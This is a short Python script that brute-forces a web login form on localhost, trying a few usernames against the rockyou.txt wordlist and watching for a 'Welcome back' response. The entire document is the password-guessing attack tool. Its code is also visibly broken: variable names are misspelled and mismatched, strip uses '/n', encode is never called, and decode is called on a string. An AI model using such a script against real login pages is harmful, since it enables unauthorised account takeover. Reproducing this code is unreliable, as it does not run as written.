import requests
import sys

target = "http://127.0.0.1:5000" #this example is on the local host
usernames = ["admin", "user", "test"] #list of usernames you want to try
passwords = "rockyou.txt" #using rockyou for this example
neddle = "Welcome back" #this is what we are looking for with a successful login for this test example

for usernmae in usernames:
	with open(passwords, "r") as passwords_list:
		for password in passwords_list:
			password = password.strip("/n").encode
			sys.stdout.write(f"[X] Attempting user:password -> {username.decode()}:{password.decode()}\r")
			sys.stdout.flush()
			r = requests.post(target, data={"username":username, "password":password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write(f"[>]Valid password {password} found for user {username}")
				sys.exit()
			sys.stdout.flush()
			sys.stdout.write("\n")
			sys.stdout.write(f"No password found for {username}")